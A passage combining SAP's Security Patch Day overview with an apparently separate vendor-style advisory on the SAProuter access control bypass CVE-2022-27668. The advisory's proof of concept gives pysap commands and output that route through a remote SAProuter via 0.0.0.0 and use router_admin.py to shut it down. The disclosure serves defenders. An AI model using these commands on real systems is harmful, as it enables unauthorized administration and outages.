## SAP Security Patch Day

The security maintenance of installed SAP software is key to continuously protect also against new types of attacks or newly identified potential weaknesses.

Based on feedback from customers, partners and SAP user groups, SAP has launched a regular **SAP Security Patch Day**, scheduled for the **second Tuesday of every month** — which has been synchronized with the Security Patch Day of other major software vendors.

On these SAP Patch Days, SAP publishes software corrections as **SAP Security Notes**, focused solely on security to protect against potential weaknesses or attacks. Access [SAP Security Notes in SAP for Me](https://me.sap.com/app/securitynotes), then select *All Security Notes*, to get the complete list of all SAP Security Notes. **We recommend that you implement these corrections at a priority**. Several tools are available to help identify, select and implement these corrections.

SAP categorizes SAP Security Notes as *Patch Day Security Not*es and *Support Package Security Notes*, with the sole purpose of making you focus on important fixes on patch days and the rest to be implemented automatically during SP upgrades. For details refer to the [SAP Security Notes FAQ](/en/my-support/knowledge-base/security-notes-news/security-notes-faqs.html). Security fixes for SAP NetWeaver based products are also delivered with the support packages.

Starting June 11, 2019, for all new SAP Security Notes with high or very high severity we deliver fix for Support Packages shipped within the last 24 months\* for the versions under Mainstream Maintenance and Extended Maintenance. This is extended from the previous Support Package coverage of 18 months.

Notes with low or medium priority contain corrections in at least the newest support package in all mainstream and extended maintenance releases.

\*For information on areas with an exception from the 24 months maintenance strategy, refer to the [SAP Security Notes FAQ](https://support.sap.com/en/my-support/knowledge-base/security-notes-news/security-notes-faqs.html?anchorId=section_237298869 "exceptions").

=======================================================================

Vendor description:
-------------------
"SAProuter is a software application that provides a remote connection
between our customer's network and SAP. SAProuter can be used to:

- Improve network security, e.g.by using a password or by only allowing
   encrypted connections from known sources
- Control and log the connections to your SAP system
- Set up an indirect connection when programs involved cannot
   communicate with each other due to the network configuration
- Increase performance and stability by reducing the SAP system workload
   within a local area network (LAN) when communicating with a wide area
   network (WAN)" [1]

[1] <https://support.sap.com/en/tools/connectivity-tools/saprouter.html>

Business recommendation:
------------------------
SEC Consult recommends to implement the security note 3158375, where the
documented issue is fixed according to the vendor. We advise installing the
correction as a matter of priority to keep business-critical data secured.

Vulnerability overview/description:
-----------------------------------
1) Improper Access Control (CVE-2022-27668)
According to SAP note 1853140: "in the default configuration, the
SAProuter does not allow a route to itself. You can explicitly permit
the 'loopback' from the SAProuter to itself using option -X".

It has been identified that under certain circumstances, this is not
valid and may lead to unexpected behavior. External attackers having
network-wise access to a (weakly configured) SAProuter instance can
exploit an improper access control vulnerability by sending packets
of type NI_ROUTE in order to establish a tunnel that allows to manage
the SAProuter externally even when it was started without option -X.

This enables an attacker to send packets of type ROUTER_ADM in order to
gain unauthorized access to administrative functions such as stopping
the remote SAProuter instance, displaying connection information,
switching trace level, or terminating a specific connection.

Proof of concept:
-----------------
1) Improper Access Control (CVE-2022-27668)
For successful exploitation of this vulnerability, the following prerequisites
must be met:

- Route permission table saprouttab must contain an entry that
   explicitly permits external hosts to connect to port 3299 of
   arbitrary hosts. Some examples of such entries are shown in
   the following listing:

   P  <source-host incl. attacker-controlled machine>  *  3299
   P  <source-host incl. attacker-controlled machine>  *  3200.3300

- SAProuter is running (option -X does not need to be set) and the
   attacker has network-wise access to its listening port.

The vulnerability can be verified by means of the publicly available
Python script router_portfw.py [2] of the open source pysap framework
developed by M. Gallo. The script, which is based on a scapy re-implementation
of the proprietary SAP Router protocol, allows for port forwarding through
a SAProuter service.

For demonstration purposes, the following simplified lab setup is used:

-------------------------------------------------------------------------
SAProuter (IPv4:192.168.56.103) <-----> Attacker (IPv4:192.168.56.104)
-------------------------------------------------------------------------
SAProuter started with option -r:  |    Pysap framework
./saprouter -r                     |
                                    |
Content of saprouttab in workdir:  |
P  192.168.56.104  *  3299         |
-------------------------------------------------------------------------

The following listing shows that it is not possible to establish a
"loopback" tunnel through the remote SAProuter service by specifying a
target destination host 127.0.0.1 (option -t) and target destination
port 3299 (option -r). As expected, this route is filtered and denied
by default even when explicitly allowed through the route permission
table.

--------------------------------------------------------------------------
attacker@192.168.56.104$ python router_portfw.py -d 192.168.56.103 -p 3299
-t 127.0.0.1 -r 3299 -a 127.0.0.1 -l 3299 -v
[*] Setting a proxy between 127.0.0.1:3299 and remote SAP Router 192.168.
56.103:3299 (talk mode raw)
SAPNIProxy: Binded to address 127.0.0.1:3299, proxying to 192.168.56.103:
3299
Routing to 127.0.0.1:3299
To send 61 bytes data + 4 bytes NI header
Received 4 bytes NI header, to receive 211 bytes data
Received 211 bytes data
Route request to 127.0.0.1:3299 not accepted by 192.168.56.103:3299
--------------------------------------------------------------------------

It was discovered that it is possible to circumvent this check using
the non-standard IPv4 broadcast address 0.0.0.0 (see RFC5735, RFC1122).
When specifying destination host 0.0.0.0 and destination port 3299,
this leads to an effective access control bypass as can be seen in the
following listing.

--------------------------------------------------------------------------
attacker@192.168.56.104$ python router_portfw.py -d 192.168.56.103 -p 3299
-t 0.0.0.0 -r 3299 -a 127.0.0.1 -l 3299 -v
[*] Setting a proxy between 127.0.0.1:3299 and remote SAP Router 192.168.
56.103:3299 (talk mode raw)
SAPNIProxy: Binded to address 127.0.0.1:3299, proxying to 192.168.56.103:
3299
Routing to 0.0.0.0:3299
To send 59 bytes data + 4 bytes NI header
Received 4 bytes NI header, to receive 8 bytes data
Received 8 bytes data
Route request to 0.0.0.0:3299 accepted by 192.168.56.103:3299

attacker@192.168.56.104$ ss -antlp | grep "3299"
LISTEN 0    5  127.0.0.1:3299  0.0.0.0:*  users:(("python",pid=1985,fd=3))
--------------------------------------------------------------------------

Once the tunnel is established, an attacker can leverage administrative
functions using its local port 3299 which is forwarded to the loopback
interface of the remote SAProuter instance. For example, the Python
script router_admin.py [3] of the pysap framework can be used to
shutdown (option -s) the running SAProuter instance on the remote host.

--------------------------------------------------------------------------
attacker@192.168.56.104$ python router_admin.py -s -d 127.0.0.1 -p 3299
[*] Requesting stop of the remote SAP Router
[*] Connected to the SAP Router 127.0.0.1:3299
[*] Using SAP Router version 40
[*] Sending Router Admin packet
